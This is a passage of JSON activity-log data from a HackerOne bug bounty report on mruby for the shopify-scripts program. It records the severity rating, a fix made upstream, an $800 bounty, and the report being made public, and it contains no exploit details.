class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-10T19:09:26.947Z","updated_at":"2017-01-10T19:09:26.947Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1411967,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-10T19:09:38.876Z","updated_at":"2017-01-10T19:09:38.876Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":18672},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1438526,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. This issue has been addressed upstream in https://github.com/mruby/mruby/pull/3402.\n\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.","markdown_message":"\u003cp\u003eThanks again for your report. This issue has been addressed upstream in \u003ca title=\"https://github.com/mruby/mruby/pull/3402\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fpull%2F3402\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/pull/3402\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-23T16:10:03.675Z","updated_at":"2017-01-23T16:10:03.675Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ston3","url":"/ston3"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467322,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Mruby and Shopify Scripts!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Mruby and Shopify Scripts!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-07T01:23:13.370Z","updated_at":"2017-02-07T01:23:13.370Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"ston3","url":"/ston3"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467323,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-07T01:23:19.032Z","updated_at":"2017-02-07T01:23:19.032Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467907,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for bounty.","markdown_message":"\u003cp\u003eThanks for bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-07T08:52:08.832Z","updated_at":"2017-02-07T08:52:08.832Z","actor":{"username":"ston3","cleared":false,"url":"/ston3","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1528897,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-09T01:23:29.836Z","updated_at":"2017-03-09T01:23:29.836Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}